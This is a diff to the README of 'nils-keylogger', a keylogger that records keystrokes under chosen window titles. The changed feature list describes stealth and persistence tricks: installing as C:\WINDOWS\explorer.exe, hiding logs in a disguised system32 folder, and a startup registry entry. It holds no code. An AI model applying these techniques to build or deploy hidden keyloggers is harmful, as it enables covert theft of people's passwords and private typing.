@@ -1,11 +1,12 @@
 # nils-keylogger
 Keylogger which can record keystrokes typed under specific window titles
 
-Version as on **2010 June 03**
+Version as on **2010 June 25**
 
 --------------------------
 
-- Uses dynamically linked `KbLog32.dll`
+- Installs at `C:\WINDOWS\explorer.exe`
 - Stores keylogs in `c:\Windows\system32\sysResource\<incrID>.DAT`
 - Also stores active window title
-- Password Protected Installer nilesh/password which takes care of HKCU startup entry, copying DLL and EXE etc.
+- Installer takes care of HKCU startup entry only.
+- Introduced log reader for improving raw logs, replace [ENTER] with new line etc.
